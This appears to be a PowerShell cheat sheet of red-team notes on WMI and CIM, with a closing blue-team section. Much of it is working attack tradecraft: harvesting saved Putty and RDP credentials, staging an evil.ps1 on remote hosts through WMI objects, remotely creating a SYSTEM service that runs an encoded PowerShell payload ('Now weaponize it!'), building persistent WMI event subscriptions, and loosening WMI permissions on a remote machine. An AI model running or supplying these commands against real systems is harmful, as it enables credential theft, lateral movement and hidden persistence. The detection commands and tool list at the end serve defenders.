# Enabled on ALL windows machines by default!
# Powershell Version 2 uses wmi, leverages port 135
# Powershell Version 3 uses cim, leverages port 135 or 5385/5386. Very firewall & NAT friendly

# to learn what is available, you can run this to see different namespaces (CIMV2 is default, not DEFAULT)
Get-WmiObject -Namespace "root" -Class "__Namespace" | select name
Get-CimInstance -Namespace "root" -Class __Namespace | select name
# pull namespaces that are embedded, you can run this recursive function
function Get-WmiNamespace{ Param( $Namespace='root') Get-WmiObject -Namespace $Namespace -Class __NAMESPACE | ForEach-Object{ ($ns = '{0}\{1}' -f $_.__Namespace,$_.Name) Get-WmiNamespace $ns } }

# Get the name of all the classes that relate to the bios
Get-WmiObject -Class *bios* -List
Get-CimClass -ClassName *bios*

# executing it
Get-WmiObject -Class Win32_BIOS
Get-CimInstance -ClassName Win32_BIOS

# Three ways to filter
# 1. Use the -Filter command
# 2. Use the Where-Object -- this is super slow because all the results ahve to return before it hits the where clause
# 3. Query parameter

# Examples of the three ways, can use Get-CimInstance too
Get-WmiObject -Class Win32_process -Filter 'Name = "explorer.exe"'
Get-WmiObject -Class Win32_process | where name -eq "explorer.exe" # version 3+
Get-WmiObject -Class Win32_process | Where-Object { $_.Name -eq "explorer.exe" } # version 2
Get-WmiObject -Query "select * from Win32_process where Name = 'explorer.exe'"

## Helpful tasks
# installed AV
Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct
Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName FirewallProduct
Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiSpywareProduct
  # Here are the tricks. ProductState has a set of bitflags to look at. If you convert it to hex, you can see what each one is
  $hx = ConvertTo-Hex $item.ProductState
  $mid = $hx.Substring(3,2)
  if($mid -match "00|01") # it is not enabled
  $end = $hx.Substring(5)
  if($end -eq "00") # it is up to date
# installed patches
# security logs


## You can download the WMI Code Creator to help make your own. Handy if you need that.

## Now run across boxes
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 127.0.0.1 -Credential $cred
  # or to run across WSMAN 
$sess = New-CimSession -ComputerName localhost -Credential $cred
Get-CimInstance -CimSession $sess -ClassName win32_operatingSystem

## Registry uses StdRegProv class
Get-WmiObject -Namespace root\default -Class StdRegProv -LIst | select -ExpandProperty Methods
Get-CimInstance -Namespace root\default -ClassName StdRegProv
# Constants for Registry Hives
$HIVE_HKROOT = 2147483648
$HIVE_HKCU = 2147483649
$HIVE_HKLM = 2147483650
$HIVE_HKU = 2147483651
$REG_SZ = 1
$REG_EXPAND_SZ = 2
$REG_BINARY = 3
$REG_DWORD = 4
$REG_MULTI_SZ = 7
$REG_QWORD = 11
### sample task
# pull IE Typed URLs
Invoke-WmiMethod -Namespace root\default -Class stdRegProv -Name EnumKey @($HIVE_HKCU,"software\microsoft\Internet explorer") | select -ExpandProperty sNames
Invoke-WmiMethod -Namespace root\default -Class stdRegProv -Name GetSTringValue @($HIVE_HKCU,"software\microsoft\internet explorer\typedurls", "url1")
# To go across remote computers
$regProd = Get-WmiObject -Namespace root\default -Class StdRegProv -List -ComputerName 192.168.50.149 -Credential $cred
$regProd.GetStringValue($HIVE_HKCU, "software\microsoft\internet explorer\typedurls","url1") | select -ExpandProperty sValue
# To make things simpler, go get Registry.ps1 from darkoperator/Posh-SecMod on github
# Pull Putty and RDP passwords from registry
  # Get from Arvanaghi on Github
Invoke-SessionGopher.ps1
Invoke-SessionGopher -Credential $creds -AllDomain
Invoke-SessionGopher -ComputerName target -Credential $creds -thorough

## Basic Enum
Get-WmiObject -Class Win32_IP4RouteTable
Get-WmiObject -Class Win32_UserAccount
Get-WmiObject -Class Win32_Group
# Also look at ActiveDirectory with ldap (must be on a computer within the domain)
Get-WmiObject -Namespace root\directory\ldap -Class ds_domain
Get-WmiObject -Namespace root\directory\ldap -Class ds_computer
# command to find the domain controller
Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | ?{ $_.ds_useraccountcontrol -eq 532480}
# Groups and Group members
Get-WmiObject -class Win32_GroupInDomain | ForEach-Object{ [wmi]$_.PartComponent }
Get-WmiObject -Class Win32_GroupUser | ForEach-Object{ $_.GroupComponent -match "Domain Admins"} | %{ [wmi]$_.PartComponent}
# sometimes the properties come back with NULLs, you can remove all those by adding this pipe to the end of your stuff:
ForEach-Object{ if( $_.value -and $_.name -notmatch "__"){ @{$($_.name) = $($_.value) } } }

## create a shadow copy
(Get-WmiObject -Class Win32_Shadowcopy -list).create("C:\", "LocationYouWantTheCopy")
$link = (Get-WmiObject -Class Win32_Shadowcopy).deviceObject + "\"
cmd /c mklink /d C:\Shadowcopy "$link"

### Using WMI to move files around
# Send-InfoWMI from WMI_Backdoor or PSTP_Master on github. Creates data inside a WMI Object
Send-InfoWMI -DataToSend (GEt-Process) -ComputerNmae 192.168.0.1 -Username Administrator
Get-InfoWMI
Send-InfoWMI -FiletoSend C:\test\evil.ps1 -ComputerName 192.168.1.1 -Username Administrator
Get-InfoWMI -Outfile C:\test\evil.ps1

## Use WMI to create your own service
# ArgumentList is: desktopInteract, Displayname, Userisnotified,Loadordergroup,loadordergroupdependencies,Name,Pathname,ServiceDependencies,Own Process,StartMode,StartName,StartPassword
$servicetype = [byte] 16
$errorcontrol = [byte] 1
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,"Windows Performance",$errorcontrol,$null,$null,"WinPerf","C:\Windows\System32\Calc.exe",$null,$servicetype, "Manual", "NT Authority\System",""
# Return value of 0 is success! Then you can verify it was made
Get-WmiObject -Class Win32_service -Filter 'Name = "WinPerf"'
# and now run it
Get-WmiObject -Class Win32_service -Filter 'Name = "WinPerf"' | Invoke-WmiMethod -Name StartService
# And to remove it
Get-WmiObject -Class Win32_service -Filter 'Name = "WinPerf"' | Remove-WmiObject
# Now weaponize it!
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,"Windows Performance",$errorcontrol,$null,$null,"WinPerf","C:\Windows\System32\cmd.exe /c powershell -e <base64Encodedscript>",$null,$servicetype, "Manual", "NT Authority\System","" -ComputerName 192.168.1.1 -Credential $cred
Get-WmiObject -Class Win32_service -Filter 'Name = "WinPerf"' -ComputerName 192.168.1.1 -Credential $cred | Invoke-WmiMethod -Name StartService


## WMI Events can be used for almost any event to execute WMI actions. Way less consumption of resources.
# WMI Events are made of Consumers and Types which are performed by polling (possible to miss events)
# To list and see what you got for Extrinsics (not built-in)
. .\Get-WmiNamespace.ps1
$namespaces = Get-WmiNamespace
foreach ($ns in $namespaces) { Get-WmiObject -Namespace $ns.FullName -List | where {$_.__SUPERCLASS -eq '__ExtrinsicEvent'} }
# to see what you got for Consumers
foreach ($ns in $namespaces) { Get-WmiObject -Namespace $ns.FullName -List | where {$_.__SUPERCLASS -eq '__EventConsumer'} }
# Helpful classes are:
  # ActiveScriptEventConsumer -> Executes a predefined VBScript or JScript
  # CommandLineEventConsumer -> Launches a process with SYSTEM privs
  # LogFileEventConsumer -> Write data to a log file
  # NTEventLogEventConsumer -> Logs a message to the Windows Event Log
  # SMTPEventConsumer -> Sends an email using SMTP
## To make your own, you need a Filter, Consumer, and Binding
# Let's make an Event that runs a VBScript when the system uptime is between 240 and 325 seconds (would be after reboot and ran as System)
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >- 240 AND TargetInstance.SystemUpTime < 325"
$filterName = "WindowsSanity"
$filterNS = "root\cimv2"
$filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL";Query=$query}
$consumerPath = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{name=$filterName; ScriptFileName=$VBSFile; ScriptingEngine="VBScript"}
$Payload = "whoami"
$consumerPath = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{name=$filterName; CommandLineTemplate=$Payload}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filterPath; Consumer=$consumerPath}
# The above is what "Add-Persistance" does from the nishang github package, as well as Persistance from PowerSploit!

## Security Descriptors
# You can modify ACE of DCOM/WMI to provide non-admin execution. You can use Set-RemoteWMI from nishang
Set-RemoteWMI -Username me -ComputerName 192.168.0.1 -Credential domain\admin

### Red-Team Tools
# PowerProvider & WheresMyImplant by 0xbadjuju on github
# PowerLurk by Sw4mpf0x on github
# WMIImplant by ChrisTruncer on github

### Blue-Team Tools
## Manually
Get-WmiObject __eventFilter -Namespace root\subscription
Get-WmiObject activeScriptEventConsumer -Namespace root\subscription
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription  # Look at the CommandLineTEmplate field for suspicious C2 stuff (especiially for base64 stuff
Get-WmiObject __filtertoconsumerbinding -Namespace root\subscription
# Can also make consumers that alert on things like registry (like catching the Set-RemoteWMI.ps1 above), make the action useful though
$Query = "Select * from RegistryValueChangeEvent where HIVE='HKEY_LOCAL_MACHINE' AND KeyPath = 'Software\\Microsoft\\Ole' AND 'ValueName='MachineLaunchRestriction '"
Register-WmiEvent -Query $query -Action {Write-Host "Modification on DCOM permissions"}
# Win10 and Server 2016 raise Event 5861 in operational logs when a new consumer is created
# If you turn on trace logs (makes HUGE volume of logs), Event 11 and 20 can see when there is a C2 operation happening with WMI on your box
## Tools Available
# WMIMon by luctalpe on github that provides a Real-time Event Trace Log activity. However, not scalable!
.\WMIMon.exe
# WMIMonitor by realparisi on github to monitor creation of consumers to create an entry with Event ID 8 in application event log
# CIMSweep can sweep networks using WinRM by PowerShellMafia on github
Import-Module cimsweep.psd1
Get-Command -Module CimSweep
$sess = New-CimSession -ComputerName 192.168.0.1
Get-CSTypedURL -CimSession $sess
Get-CSWmiPersistanceL -CimSession $sess
# WMI-IDS is an agentless HIDS
Import-Module .\WMI_IDS.psm1
Get-WMIPersistenceItem
New-AlertTrigger -EventConsumer CommandLineEventConsumer -TriggerType Creation | New-AlertAction -EventLogEntry | Register-Alert -Computername localhost
# other tools are Uproot by Invoke-IR and Kansa by davehull on github.

